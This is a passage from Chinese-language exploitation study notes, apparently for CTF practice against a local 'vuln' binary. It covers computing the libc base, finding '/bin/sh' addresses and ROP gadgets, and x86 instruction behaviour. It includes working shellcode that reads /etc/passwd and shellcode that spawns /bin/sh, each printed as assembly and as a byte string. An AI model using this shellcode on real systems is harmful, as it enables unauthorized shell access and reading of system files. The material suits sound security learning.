exited normally]\nWarning: not running or target is remote\ngdb-peda$ p system\n$2 = {int (const char *)} 0x7ffff7a33440 <__libc_system>\n```\n\n然后就可以计算libc的基地址:\n\n>  0x7ffff7a33440 - 0x4f440 = 0x7ffff79e4000\n\n## 查找\"/bin/sh\"的偏移地址\n\n方法一:\n\n```\ntianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ rafind2 -z -s /bin/sh /lib/x86_64-linux-gnu/libc.so.6\n0x1b3e9a\n```\n\n方法二:\n\n在ida中查找。\n\n方法三:\n\n在环境变量中查找。\n\n```shell\ntianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ gdb -q vuln\nCatchpoint 1 (exec)\nReading symbols from vuln...done.\ngdb-peda$ b *main\nBreakpoint 2 at 0x555555554739: file vuln.c, line 17.\ngdb-peda$ r\nStarting program: /home/tianji/Desktop/sploit/bypassaslr_1/vuln \n\n[----------------------------------registers-----------------------------------]\nRAX: 0x555555554739 (<main>:\tpush   rbp)\nRBX: 0x0 \nRCX: 0x555555554790 (<__libc_csu_init>:\tpush   r15)\nRDX: 0x7fffffffddf8 --> 0x7fffffffe1c7 (\"CLUTTER_IM_MODULE=xim\")\nRSI: 0x7fffffffdde8 --> 0x7fffffffe199 (\"/home/tianji/Desktop/sploit/bypassaslr_1/vuln\")\nRDI: 0x1 \nRBP: 0x555555554790 (<__libc_csu_init>:\tpush   r15)\nRSP: 0x7fffffffdd08 --> 0x7ffff7a05b97 (<__libc_start_main+231>:\tmov    edi,eax)\nRIP: 0x555555554739 (<main>:\tpush   rbp)\nR8 : 0x7ffff7dd0d80 --> 0x0 \nR9 : 0x7ffff7dd0d80 --> 0x0 \nR10: 0x0 \nR11: 0x1 \nR12: 0x555555554610 (<_start>:\txor    ebp,ebp)\nR13: 0x7fffffffdde0 --> 0x1 \nR14: 0x0 \nR15: 0x0\nEFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)\n[-------------------------------------code-------------------------------------]\n   0x55555555472a <shell+16>:\tcall   0x5555555545d0 <system@plt>\n   0x55555555472f <shell+21>:\tmov    edi,0x0\n   0x555555554734 <shell+26>:\tcall   0x5555555545f0 <exit@plt>\n=> 0x555555554739 <main>:\tpush   rbp\n   0x55555555473a <main+1>:\tmov    rbp,rsp\n   0x55555555473d <main+4>:\tsub    rsp,0x120\n   0x555555554744 <main+11>:\tmov    DWORD PTR [rbp-0x114],edi\n   0x55555555474a <main+17>:\tmov    QWORD PTR [rbp-0x120],rsi\n[------------------------------------stack-------------------------------------]\n0000| 0x7fffffffdd08 --> 0x7ffff7a05b97 (<__libc_start_main+231>:\tmov    edi,eax)\n0008| 0x7fffffffdd10 --> 0x1 \n0016| 0x7fffffffdd18 --> 0x7fffffffdde8 --> 0x7fffffffe199 (\"/home/tianji/Desktop/sploit/bypassaslr_1/vuln\")\n0024| 0x7fffffffdd20 --> 0x100008000 \n0032| 0x7fffffffdd28 --> 0x555555554739 (<main>:\tpush   rbp)\n0040| 0x7fffffffdd30 --> 0x0 \n0048| 0x7fffffffdd38 --> 0xbd88a50cb0fd83be \n0056| 0x7fffffffdd40 --> 0x555555554610 (<_start>:\txor    ebp,ebp)\n[------------------------------------------------------------------------------]\nLegend: code, data, rodata, value\n\nBreakpoint 2, main (argc=0x7fff, argv=0x0) at vuln.c:17\nwarning: Source file is more recent than executable.\n17\tint main(int argc, char* argv[]) {\ngdb-peda$ telescope 100\n0000| 0x7fffffffdd08 --> 0x7ffff7a05b97 (<__libc_start_main+231>:\tmov    edi,eax)\n0008| 0x7fffffffdd10 --> 0x1 \n0016| 0x7fffffffdd18 --> 0x7fffffffdde8 --> 0x7fffffffe199 (\"/home/tianji/Desktop/sploit/bypassaslr_1/vuln\")\n0024| 0x7fffffffdd20 --> 0x100008000 \n0032| 0x7fffffffdd28 --> 0x555555554739 (<main>:\tpush   rbp)\n0040| 0x7fffffffdd30 --> 0x0 \n0048| 0x7fffffffdd38 --> 0xbd88a50cb0fd83be \n0056| 0x7fffffffdd40 --> 0x555555554610 (<_start>:\txor    ebp,ebp)\n0064| 0x7fffffffdd48 --> 0x7fffffffdde0 --> 0x1 \n0072| 0x7fffffffdd50 --> 0x0 \n0080| 0x7fffffffdd58 --> 0x0 \n0088| 0x7fffffffdd60 --> 0xe8ddf05985fd83be \n0096| 0x7fffffffdd68 --> 0xe8dde0e6894383be \n0104| 0x7fffffffdd70 --> 0x7fff00000000 \n0112| 0x7fffffffdd78 --> 0x0 \n0120| 0x7fffffffdd80 --> 0x0 \n0128| 0x7fffffffdd88 --> 0x7ffff7de5733 (<_dl_init+259>:\tadd    r14,0x8)\n0136| 0x7fffffffdd90 --> 0x7ffff7dcb638 --> 0x7ffff7b7de10 --> 0x8348535554415541 \n0144| 0x7fffffffdd98 --> 0x2225ab63 \n0152| 0x7fffffffdda0 --> 0x0 \n0160| 0x7fffffffdda8 --> 0x0 \n0168| 0x7fffffffddb0 --> 0x0 \n0176| 0x7fffffffddb8 --> 0x555555554610 (<_start>:\txor    ebp,ebp)\n0184| 0x7fffffffddc0 --> 0x7fffffffdde0 --> 0x1 \n0192| 0x7fffffffddc8 --> 0x55555555463a (<_start+42>:\thlt)\n--More--(25/100)\n0200| 0x7fffffffddd0 --> 0x7fffffffddd8 --> 0x1c \n0208| 0x7fffffffddd8 --> 0x1c \n0216| 0x7fffffffdde0 --> 0x1 \n0224| 0x7fffffffdde8 --> 0x7fffffffe199 (\"/home/tianji/Desktop/sploit/bypassaslr_1/vuln\")\n0232| 0x7fffffffddf0 --> 0x0 \n0240| 0x7fffffffddf8 --> 0x7fffffffe1c7 (\"CLUTTER_IM_MODULE=xim\")\n0248| 0x7fffffffde00 --> 0x7fffffffe1dd (\"LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc\"...)\n0256| 0x7fffffffde08 --> 0x7fffffffe7c9 (\"LC_MEASUREMENT=zh_CN.UTF-8\")\n0264| 0x7fffffffde10 --> 0x7fffffffe7e4 (\"LESSCLOSE=/usr/bin/lesspipe %s %s\")\n0272| 0x7fffffffde18 --> 0x7fffffffe806 (\"LC_PAPER=zh_CN.UTF-8\")\n0280| 0x7fffffffde20 --> 0x7fffffffe81b (\"LC_MONETARY=zh_CN.UTF-8\")\n0288| 0x7fffffffde28 --> 0x7fffffffe833 (\"XDG_MENU_PREFIX=gnome-\")\n0296| 0x7fffffffde30 --> 0x7fffffffe84a (\"_=/usr/bin/gdb\")\n0304| 0x7fffffffde38 --> 0x7fffffffe859 (\"LANG=en_US.UTF-8\")\n0312| 0x7fffffffde40 --> 0x7fffffffe86a (\"DISPLAY=:0\")\n0320| 0x7fffffffde48 --> 0x7fffffffe875 (\"OLDPWD=/home/tianji/Desktop/sploit\")\n0328| 0x7fffffffde50 --> 0x7fffffffe898 (\"GNOME_SHELL_SESSION_MODE=ubuntu\")\n0336| 0x7fffffffde58 --> 0x7fffffffe8b8 (\"COLORTERM=truecolor\")\n0344| 0x7fffffffde60 --> 0x7fffffffe8cc (\"USERNAME=tianji\")\n0352| 0x7fffffffde68 --> 0x7fffffffe8dc (\"XDG_VTNR=1\")\n0360| 0x7fffffffde70 --> 0x7fffffffe8e7 (\"SSH_AUTH_SOCK=/run/user/1000/keyring/ssh\")\n0368| 0x7fffffffde78 --> 0x7fffffffe910 (\"MANDATORY_PATH=/usr/share/gconf/ubuntu.mandatory.path\")\n0376| 0x7fffffffde80 --> 0x7fffffffe946 (\"LC_NAME=zh_CN.UTF-8\")\n0384| 0x7fffffffde88 --> 0x7fffffffe95a (\"XDG_SESSION_ID=1\")\n0392| 0x7fffffffde90 --> 0x7fffffffe96b (\"USER=tianji\")\n--More--(50/100)\n0400| 0x7fffffffde98 --> 0x7fffffffe977 (\"DESKTOP_SESSION=ubuntu\")\n0408| 0x7fffffffdea0 --> 0x7fffffffe98e (\"QT4_IM_MODULE=fcitx\")\n0416| 0x7fffffffdea8 --> 0x7fffffffe9a2 (\"TEXTDOMAINDIR=/usr/share/locale/\")\n0424| 0x7fffffffdeb0 --> 0x7fffffffe9c3 (\"GNOME_TERMINAL_SCREEN=/org/gnome/Terminal/screen/d3da222f_3cd5_4897_a029_a411cbf1e9fa\")\n0432| 0x7fffffffdeb8 --> 0x7fffffffea19 (\"DEFAULTS_PATH=/usr/share/gconf/ubuntu.default.path\")\n0440| 0x7fffffffdec0 --> 0x7fffffffea4c (\"PWD=/home/tianji/Desktop/sploit/bypassaslr_1\")\n0448| 0x7fffffffdec8 --> 0x7fffffffea79 (\"LINES=24\")\n0456| 0x7fffffffded0 --> 0x7fffffffea82 (\"HOME=/home/tianji\")\n0464| 0x7fffffffded8 --> 0x7fffffffea94 (\"TEXTDOMAIN=im-config\")\n0472| 0x7fffffffdee0 --> 0x7fffffffeaa9 (\"SSH_AGENT_PID=1606\")\n0480| 0x7fffffffdee8 --> 0x7fffffffeabc (\"QT_ACCESSIBILITY=1\")\n0488| 0x7fffffffdef0 --> 0x7fffffffeacf (\"XDG_SESSION_TYPE=x11\")\n0496| 0x7fffffffdef8 --> 0x7fffffffeae4 (\"XDG_DATA_DIRS=/usr/share/ubuntu:/usr/local/share:/usr/share:/var/lib/snapd/desktop\")\n0504| 0x7fffffffdf00 --> 0x7fffffffeb37 (\"XDG_SESSION_DESKTOP=ubuntu\")\n0512| 0x7fffffffdf08 --> 0x7fffffffeb52 (\"LC_ADDRESS=zh_CN.UTF-8\")\n0520| 0x7fffffffdf10 --> 0x7fffffffeb69 (\"GJS_DEBUG_OUTPUT=stderr\")\n0528| 0x7fffffffdf18 --> 0x7fffffffeb81 (\"LC_NUMERIC=zh_CN.UTF-8\")\n0536| 0x7fffffffdf20 --> 0x7fffffffeb98 (\"ALL_PROXY=socks://127.0.0.1:1080/\")\n0544| 0x7fffffffdf28 --> 0x7fffffffebba (\"no_proxy=localhost,127.0.0.0/8,::1\")\n0552| 0x7fffffffdf30 --> 0x7fffffffebdd (\"GTK_MODULES=gail:atk-bridge\")\n0560| 0x7fffffffdf38 --> 0x7fffffffebf9 (\"NO_PROXY=localhost,127.0.0.0/8,::1\")\n0568| 0x7fffffffdf40 --> 0x7fffffffec1c (\"COLUMNS=79\")\n0576| 0x7fffffffdf48 --> 0x7fffffffec27 (\"WINDOWPATH=1\")\n0584| 0x7fffffffdf50 --> 0x7fffffffec34 (\"SHELL=/bin/bash\")\n0592| 0x7fffffffdf58 --> 0x7fffffffec44 (\"VTE_VERSION=5201\")\n```\n\n我们可以看到“SHELL=/bin/bash”的地址:`0x7fffffffec34`,然后去掉`SHELL`,这样“/bin/bash”的地址就是`0x7fffffffec3a`\n\n```\ngdb-peda$ x/s 0x7fffffffec3a\n0x7fffffffec3a:\t\"/bin/bash\"\n```\n\n当然，我这里是\"/bin/bash\",所以这方法不可行。这时候，可以添加环境变量。\n\n```\ntianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ export ABC=/bin/sh\ntianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ gdb -q vuln\nCatchpoint 1 (exec)\nReading symbols from vuln...done.\ngdb-peda$ b *main\nBreakpoint 2 at 0x739: file vuln.c, line 17.\ngdb-peda$ r\nStarting program: /home/tianji/Desktop/sploit/bypassaslr_1/vuln \n\n[----------------------------------registers-----------------------------------]\nRAX: 0x555555554739 (<main>:\tpush   rbp)\nRBX: 0x0 \nRCX: 0x555555554790 (<__libc_csu_init>:\tpush   r15)\nRDX: 0x7fffffffdde8 --> 0x7fffffffe1bb (\"CLUTTER_IM_MODULE=xim\")\nRSI: 0x7fffffffddd8 --> 0x7fffffffe18d (\"/home/tianji/Desktop/sploit/bypassaslr_1/vuln\")\nRDI: 0x1 \nRBP: 0x555555554790 (<__libc_csu_init>:\tpush   r15)\nRSP: 0x7fffffffdcf8 --> 0x7ffff7a05b97 (<__libc_start_main+231>:\tmov    edi,eax)\nRIP: 0x555555554739 (<main>:\tpush   rbp)\nR8 : 0x7ffff7dd0d80 --> 0x0 \nR9 : 0x7ffff7dd0d80 --> 0x0 \nR10: 0x0 \nR11: 0x1 \nR12: 0x555555554610 (<_start>:\txor    ebp,ebp)\nR13: 0x7fffffffddd0 --> 0x1 \nR14: 0x0 \nR15: 0x0\nEFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)\n[-------------------------------------code-------------------------------------]\n   0x55555555472a <shell+16>:\tcall   0x5555555545d0 <system@plt>\n   0x55555555472f <shell+21>:\tmov    edi,0x0\n   0x555555554734 <shell+26>:\tcall   0x5555555545f0 <exit@plt>\n=> 0x555555554739 <main>:\tpush   rbp\n   0x55555555473a <main+1>:\tmov    rbp,rsp\n   0x55555555473d <main+4>:\tsub    rsp,0x120\n   0x555555554744 <main+11>:\tmov    DWORD PTR [rbp-0x114],edi\n   0x55555555474a <main+17>:\tmov    QWORD PTR [rbp-0x120],rsi\n[------------------------------------stack-------------------------------------]\n0000| 0x7fffffffdcf8 --> 0x7ffff7a05b97 (<__libc_start_main+231>:\tmov    edi,eax)\n0008| 0x7fffffffdd00 --> 0x1 \n0016| 0x7fffffffdd08 --> 0x7fffffffddd8 --> 0x7fffffffe18d (\"/home/tianji/Desktop/sploit/bypassaslr_1/vuln\")\n0024| 0x7fffffffdd10 --> 0x100008000 \n0032| 0x7fffffffdd18 --> 0x555555554739 (<main>:\tpush   rbp)\n0040| 0x7fffffffdd20 --> 0x0 \n0048| 0x7fffffffdd28 --> 0x6b6b7edd8dce246d \n0056| 0x7fffffffdd30 --> 0x555555554610 (<_start>:\txor    ebp,ebp)\n[------------------------------------------------------------------------------]\nLegend: code, data, rodata, value\n\nBreakpoint 2, main (argc=0x7fff, argv=0x0) at vuln.c:17\nwarning: Source file is more recent than executable.\n17\tint main(int argc, char* argv[]) {\ngdb-peda$ telescope 200\n0000| 0x7fffffffdcf8 --> 0x7ffff7a05b97 (<__libc_start_main+231>:\tmov    edi,eax)\n0008| 0x7fffffffdd00 --> 0x1 \n0016| 0x7fffffffdd08 --> 0x7fffffffddd8 --> 0x7fffffffe18d (\"/home/tianji/Desktop/sploit/bypassaslr_1/vuln\")\n0024| 0x7fffffffdd10 --> 0x100008000 \n0032| 0x7fffffffdd18 --> 0x555555554739 (<main>:\tpush   rbp)\n0040| 0x7fffffffdd20 --> 0x0 \n0048| 0x7fffffffdd28 --> 0x6b6b7edd8dce246d \n0056| 0x7fffffffdd30 --> 0x555555554610 (<_start>:\txor    ebp,ebp)\n0064| 0x7fffffffdd38 --> 0x7fffffffddd0 --> 0x1 \n0072| 0x7fffffffdd40 --> 0x0 \n0080| 0x7fffffffdd48 --> 0x0 \n0088| 0x7fffffffdd50 --> 0x3e3e2b88b8ee246d \n0096| 0x7fffffffdd58 --> 0x3e3e3b37b470246d \n0104| 0x7fffffffdd60 --> 0x7fff00000000 \n0112| 0x7fffffffdd68 --> 0x0 \n0120| 0x7fffffffdd70 --> 0x0 \n0128| 0x7fffffffdd78 --> 0x7ffff7de5733 (<_dl_init+259>:\tadd    r14,0x8)\n0136| 0x7fffffffdd80 --> 0x7ffff7dcb638 --> 0x7ffff7b7de10 --> 0x8348535554415541 \n0144| 0x7fffffffdd88 --> 0x22bf66c6 \n0152| 0x7fffffffdd90 --> 0x0 \n0160| 0x7fffffffdd98 --> 0x0 \n0168| 0x7fffffffdda0 --> 0x0 \n0176| 0x7fffffffdda8 --> 0x555555554610 (<_start>:\txor    ebp,ebp)\n0184| 0x7fffffffddb0 --> 0x7fffffffddd0 --> 0x1 \n0192| 0x7fffffffddb8 --> 0x55555555463a (<_start+42>:\thlt)\n--More--(25/200)\n0200| 0x7fffffffddc0 --> 0x7fffffffddc8 --> 0x1c \n0208| 0x7fffffffddc8 --> 0x1c \n0216| 0x7fffffffddd0 --> 0x1 \n0224| 0x7fffffffddd8 --> 0x7fffffffe18d (\"/home/tianji/Desktop/sploit/bypassaslr_1/vuln\")\n0232| 0x7fffffffdde0 --> 0x0 \n0240| 0x7fffffffdde8 --> 0x7fffffffe1bb (\"CLUTTER_IM_MODULE=xim\")\n0248| 0x7fffffffddf0 --> 0x7fffffffe1d1 (\"LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arc\"...)\n0256| 0x7fffffffddf8 --> 0x7fffffffe7bd (\"LC_MEASUREMENT=zh_CN.UTF-8\")\n0264| 0x7fffffffde00 --> 0x7fffffffe7d8 (\"LESSCLOSE=/usr/bin/lesspipe %s %s\")\n0272| 0x7fffffffde08 --> 0x7fffffffe7fa (\"LC_PAPER=zh_CN.UTF-8\")\n0280| 0x7fffffffde10 --> 0x7fffffffe80f (\"LC_MONETARY=zh_CN.UTF-8\")\n0288| 0x7fffffffde18 --> 0x7fffffffe827 (\"XDG_MENU_PREFIX=gnome-\")\n0296| 0x7fffffffde20 --> 0x7fffffffe83e (\"_=/usr/bin/gdb\")\n0304| 0x7fffffffde28 --> 0x7fffffffe84d (\"LANG=en_US.UTF-8\")\n0312| 0x7fffffffde30 --> 0x7fffffffe85e (\"DISPLAY=:0\")\n0320| 0x7fffffffde38 --> 0x7fffffffe869 (\"ABC=/bin/sh\")\n0328| 0x7fffffffde40 --> 0x7fffffffe875 (\"OLDPWD=/home/tianji/Desktop/sploit\")\n0336| 0x7fffffffde48 --> 0x7fffffffe898 (\"GNOME_SHELL_SESSION_MODE=ubuntu\")\n0344| 0x7fffffffde50 --> 0x7fffffffe8b8 (\"COLORTERM=truecolor\")\n0352| 0x7fffffffde58 --> 0x7fffffffe8cc (\"USERNAME=tianji\")\n0360| 0x7fffffffde60 --> 0x7fffffffe8dc (\"XDG_VTNR=1\")\n0368| 0x7fffffffde68 --> 0x7fffffffe8e7 (\"SSH_AUTH_SOCK=/run/user/1000/keyring/ssh\")\n0376| 0x7fffffffde70 --> 0x7fffffffe910 (\"MANDATORY_PATH=/usr/share/gconf/ubuntu.mandatory.path\")\n0384| 0x7fffffffde78 --> 0x7fffffffe946 (\"LC_NAME=zh_CN.UTF-8\")\n0392| 0x7fffffffde80 --> 0x7fffffffe95a (\"XDG_SESSION_ID=1\")\n```\n\n可以看到\"/bin/sh\"的地址：`0x7fffffffe869 + 0x6 = 0x7fffffffe86e`。\n\n```\ngdb-peda$ x/s 0x7fffffffe86e\n0x7fffffffe86e:\t\"bin/sh\"\n```\n\n当然，这个方法仅限本地使用。\n\n## 反汇编代码\n\n```\ntianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ rasm2 \"jmp rsp\"\nffe4\ntianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ rasm2 \"pop rdi; ret\"\n5fc3\ntianji@tianji-machine:~/Desktop/sploit/heap/unlink$ disasm \"5fc3\"\n   0:    5f                       pop    edi\n   1:    c3                       ret\n```\n## 在可执行文件中找gadget\n\n方法一:\n\n```\ntianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ rafind2 -x 5fc3 -X vuln\n0x7f3\n- offset -   0 1  2 3  4 5  6 7  8 9  A B  C D  E F  0123456789ABCDEF\n0x000007f3  5fc3 9066 2e0f 1f84 0000 0000 00f3 c300  _..f............\n0x00000803  0048 83ec 0848 83c4 08c3 0000 0001 0002  .H...H..........\n0x00000813  002f 6269 6e2f 7368 0001 1b03 3b40 0000  ./bin/sh....;@..\n0x00000823  0007 0000 0094 fdff ff8c 0000 00e4 fdff  ................\n0x00000833  ffb4 0000 00f4 fdff ff5c 0000 00fe       .........\\....\n```\n\n可以看到5fc3的偏移位置就是: '0x7f3'\n\n方法二:\n\n```\ntianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ ROPgadget --binary vuln --all\nGadgets information\n============================================================\n0x0000000000000707 : add bl, dh ; ret\n0x00000000000007ff : add bl, dh ; ret\n0x0000000000000703 : add byte ptr [rax], 0 ; add byte ptr [rax], al ; ret\n0x0000000000000705 : add byte ptr [rax], al ; add bl, dh ; ret\n0x00000000000007fd : add byte ptr [rax], al ; add bl, dh ; ret\n0x00000000000007fb : add byte ptr [rax], al ; add byte ptr [rax], al ; add bl, dh ; ret\n0x0000000000000786 : add byte ptr [rax], al ; add byte ptr [rax], al ; leave ; ret\n0x000000000000066c : add byte ptr [rax], al ; add byte ptr [rax], al ; pop rbp ; ret\n0x00000000000006bc : add byte ptr [rax], al ; add byte ptr [rax], al ; pop rbp ; ret\n0x0000000000000704 : add byte ptr [rax], al ; add byte ptr [rax], al ; ret\n0x00000000000007fc : add byte ptr [rax], al ; add byte ptr [rax], al ; ret\n0x0000000000000787 : add byte ptr [rax], al ; add cl, cl ; ret\n0x0000000000000788 : add byte ptr [rax], al ; leave ; ret\n0x000000000000066e : add byte ptr [rax], al ; pop rbp ; ret\n0x00000000000006be : add byte ptr [rax], al ; pop rbp ; ret\n0x0000000000000706 : add byte ptr [rax], al ; ret\n0x00000000000007fe : add byte ptr [rax], al ; ret\n0x00000000000006fd : add byte ptr [rcx], al ; pop rbp ; ret\n0x0000000000000789 : add cl, cl ; ret\n0x00000000000005a3 : add esp, 8 ; ret\n0x0000000000000809 : add esp, 8 ; ret\n0x00000000000005a2 : add rsp, 8 ; ret\n0x0000000000000808 : add rsp, 8 ; ret\n0x0000000000000599 : and byte ptr [rax], al ; test rax, rax ; je 0x5a9 ; call rax\n0x000000000000065c : and byte ptr [rax], al ; test rax, rax ; je 0x678 ; pop rbp ; jmp rax\n0x00000000000006ad : and byte ptr [rax], al ; test rax, rax ; je 0x6c8 ; pop rbp ; jmp rax\n0x00000000000007d9 : call qword ptr [r12 + rbx*8]\n0x00000000000007da : call qword ptr [rsp + rbx*8]\n0x00000000000005a0 : call rax\n0x00000000000007dc : fmul qword ptr [rax - 0x7d] ; ret\n0x000000000000059e : je 0x5a4 ; call rax\n0x0000000000000661 : je 0x673 ; pop rbp ; jmp rax\n0x00000000000006b2 : je 0x6c3 ; pop rbp ; jmp rax\n0x0000000000000664 : jmp rax\n0x00000000000006b5 : jmp rax\n0x000000000000078a : leave ; ret\n0x00000000000006f8 : mov byte ptr [rip + 0x200911], 1 ; pop rbp ; ret\n0x0000000000000785 : mov eax, 0 ; leave ; ret\n0x00000000000007d7 : mov edi, ebp ; call qword ptr [r12 + rbx*8]\n0x00000000000007d6 : mov edi, r13d ; call qword ptr [r12 + rbx*8]\n0x0000000000000668 : nop dword ptr [rax + rax] ; pop rbp ; ret\n0x00000000000006b8 : nop dword ptr [rax + rax] ; pop rbp ; ret\n0x00000000000007f8 : nop dword ptr [rax + rax] ; ret\n0x0000000000000701 : nop dword ptr [rax] ; ret\n0x00000000000006b3 : or al, 0x5d ; jmp rax\n0x00000000000006fb : or dword ptr [rax], esp ; add byte ptr [rcx], al ; pop rbp ; ret\n0x00000000000007d8 : out dx, eax ; call qword ptr [r12 + rbx*8]\n0x00000000000007ec : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret\n0x00000000000007ee : pop r13 ; pop r14 ; pop r15 ; ret\n0x00000000000007f0 : pop r14 ; pop r15 ; ret\n0x00000000000007f2 : pop r15 ; ret\n0x0000000000000663 : pop rbp ; jmp rax\n0x00000000000006b4 : pop rbp ; jmp rax\n0x00000000000007eb : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret\n0x00000000000007ef : pop rbp ; pop r14 ; pop r15 ; ret\n0x0000000000000670 : pop rbp ; ret\n0x00000000000006c0 : pop rbp ; ret\n0x00000000000006ff : pop rbp ; ret\n0x00000000000007f3 : pop rdi ; ret\n0x00000000000007f1 : pop rsi ; pop r15 ; ret\n0x00000000000007ed : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret\n0x00000000000005a6 : ret\n0x0000000000000671 : ret\n0x00000000000006c1 : ret\n0x0000000000000700 : ret\n0x0000000000000709 : ret\n0x0000000000000708 : ret\n0x000000000000078b : ret\n0x00000000000007df : ret\n0x00000000000007f4 : ret\n0x0000000000000801 : ret\n0x0000000000000800 : ret\n0x000000000000080c : ret\n0x000000000000059d : sal byte ptr [rdx + rax - 1], 0xd0 ; add rsp, 8 ; ret\n0x0000000000000805 : sub esp, 8 ; add rsp, 8 ; ret\n0x0000000000000804 : sub rsp, 8 ; add rsp, 8 ; ret\n0x000000000000066a : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; pop rbp ; ret\n0x00000000000006ba : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; pop rbp ; ret\n0x00000000000007fa : test byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; ret\n0x000000000000059c : test eax, eax ; je 0x5a6 ; call rax\n0x000000000000065f : test eax, eax ; je 0x675 ; pop rbp ; jmp rax\n0x00000000000006b0 : test eax, eax ; je 0x6c5 ; pop rbp ; jmp rax\n0x000000000000059b : test rax, rax ; je 0x5a7 ; call rax\n0x000000000000065e : test rax, rax ; je 0x676 ; pop rbp ; jmp rax\n0x00000000000006af : test rax, rax ; je 0x6c6 ; pop rbp ; jmp rax\n\nUnique gadgets found: 85\ntianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ ROPgadget --binary vuln --all | grep \"pop rdi ; ret\"\n0x00000000000007f3 : pop rdi ; ret\n```\n## shellcode编写\n\n读取/etc/passwd\n\n```\nBITS 64 \n; Author Mr.Un1k0d3r - RingZer0 Team \n; Read /etc/passwd Linux x86_64 Shellcode \n; Shellcode size 82 bytes \nglobal _start \nsection .text \n_start: \n    jmp _push_filename \n\n_readfile: \n    ; syscall open file \n    pop rdi   ; pop path value \n    ; NULL byte fix \n    xor byte [rdi + 11], 0x41 \n\n    xor rax, rax \n    add al, 2 \n    xor rsi, rsi  ; set O_RDONLY flag \n    syscall \n\n    ; syscall read file \n    sub sp, 0xfff \n    lea rsi, [rsp] \n    mov rdi, rax \n    xor rdx, rdx \n    mov dx, 0xfff   ; size to read \n    xor rax, rax \n    syscall \n\n    ; syscall write to stdout \n    xor rdi, rdi \n    add dil, 1 ; set stdout fd = 1 \n    mov rdx, rax \n    xor rax, rax \n    add al, 1 \n    syscall \n\n    ; syscall exit \n    xor rax, rax \n    add al, 60 \n    syscall \n\n_push_filename: \n    call _readfile \n    path: db \"/etc/passwdA\" \n```\n\n```\n$ nasm -f elf64 readfile.asm -o readfile.o \n$ for i in $(objdump  -d readfile.o | grep \"^ \" | cut  -f2); do echo  -n  '\\x'$i; done; echo \n\\xeb\\x3f\\x5f\\x80\\x77\\x0b\\x41\\x48\\x31\\xc0\\x04\\x02\\x48\\x31\\xf6\\x0f\\x05\\x6 \n6\\x81\\xec\\xff\\x0f\\x48\\x8d\\x34\\x24\\x48\\x89\\xc7\\x48\\x31\\xd2\\x66\\xba\\xff\\x \n0f\\x48\\x31\\xc0\\x0f\\x05\\x48\\x31\\xff\\x40\\x80\\xc7\\x01\\x48\\x89\\xc2\\x48\\x31\\ \nxc0\\x04\\x01\\x0f\\x05\\x48\\x31\\xc0\\x04\\x3c\\x0f\\x05\\xe8\\xbc\\xff\\xff\\xff\\x2f \n\\x65\\x74\\x63\\x2f\\x70\\x61\\x73\\x73\\x77\\x64\\x41 \n```\n\nexecve /bin/sh\n\n```\n.global _start\n_start:\n    xor %esi, %esi\n    # /bin//sh\n    movabs $0x68732f2f6e69622f, %rbx\n    push %rsi\n    push %rbx\n    push %rsp\n    pop %rdi\n    pushq $59\n    pop %rax\n    xor %edx, %edx\n    syscall\n```\n\n```\\\ntianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ vim sh.s\ntianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ as sh.s -o sh.s.o\ntianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ ld sh.s.o -o sh\ntianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ ./sh\n$ asd\nsh: 1: asd: not found\ntianji@tianji-machine:~/Desktop/sploit/bypassaslr_1$ for i in $(objdump -d sh | grep \"^ \" | cut -f2); do echo -n '\\x'$i; done; echo\n\\x31\\xf6\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x56\\x53\\x54\\x5f\\x6a\\x3b\\x58\\x31\\xd2\\x0f\\x05\n```\n## retn和leave和call\n\nretn: \n\n> 64位: pop rip;  rsp = rsp + 8\n>\n> 32位: pop eip; esp = esp + 4\n>\n> retn N操作：先eip=[esp]，然后esp=esp+4+N\n\nleave:\n\n> 64位: move rsp rbp; pop rbp               将rbp中的值传给rsp\n>\n> 32位: move esp ebp; pop ebp             将ebp中的值传给esp\n\ncall:\n\n> 64位: push rip; jump 目的位置\n>\n> 32位: push eip; jump 目的位置\n\n## 32位寻找偏移\n\n> pattern_create 50\n>\n> pattern_offset 字符串\n\n## 有符号整数比较和无符号整数比较\n\n| 指令 | 含义                                     | 运算符号 |\n| ---- | ---------------------------------------- | -------- |\n| jbe  | unsigned below or equal (lower or same)  | <=       |\n| jae  | unsigned above or equal (higher or same) | >=       |\n| jb   | unsigned below (lower)                   | <        |\n| ja   | unsigned above (higher)                  | >        |\n| jle  | signed less or equal                     | <=       |\n| jge  | signed greater or equal                  | >=       |\n| jl   | signed less than                         | <        |\n| jg   | signed greater than                      | >        |\n\n从上面的表中可以看出，\n\n对于无符号（unsigned）整数比较，使用的是单词是above或below；\n对于有符号(signed)整数比较，则使用的单词是greater或less。\n\n## 查找argv[0]变量的地址\n\n```\ngdb-peda$ find /home\nSearching for '/home' in: 